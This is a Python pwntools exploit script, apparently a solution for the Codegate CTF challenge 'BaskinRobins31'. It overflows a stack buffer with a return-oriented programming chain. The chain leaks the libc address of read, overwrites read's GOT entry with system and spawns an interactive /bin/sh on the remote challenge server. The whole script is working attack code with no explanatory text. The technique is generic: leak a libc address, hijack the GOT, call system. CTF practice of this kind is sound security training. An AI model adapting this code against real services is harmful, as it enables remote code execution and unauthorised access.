from pwn import *

p = remote("ch41l3ng3s.codegate.kr", 3131)
#p = process("./BaskinRobins31")
elf = ELF("./BaskinRobins31")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

context.log_level='debug'

p.recvuntil("How many numbers do you want to take ? (1-3)\n")
pay = "A"*0xb0 + "B"*8


poprdi = 0x0000000000400bc3
poprsi_rdx = 0x000000000040087b

pay += p64(poprdi) + p64(0) + p64(poprsi_rdx) + p64(elf.bss() + 16) + p64(8) + p64(elf.plt['read'])
pay += p64(poprdi) + p64(1) + p64(poprsi_rdx) + p64(elf.got['read']) + p64(8) + p64(elf.plt['write'])
pay += p64(poprdi) + p64(0) + p64(poprsi_rdx) + p64(elf.got['read']) + p64(8) + p64(elf.plt['read'])
pay += p64(poprdi) + p64(elf.bss() + 16) + p64(elf.plt['read'])

p.send(pay)
sleep(0.1)
p.recvuntil("Don't break the rules...:( \n")
p.send("/bin/sh\x00")
leak = u64(p.recv(8)[0:])
system = leak - libc.symbols['read'] + libc.symbols['system']
p.send(p64(system))
p.interactive()
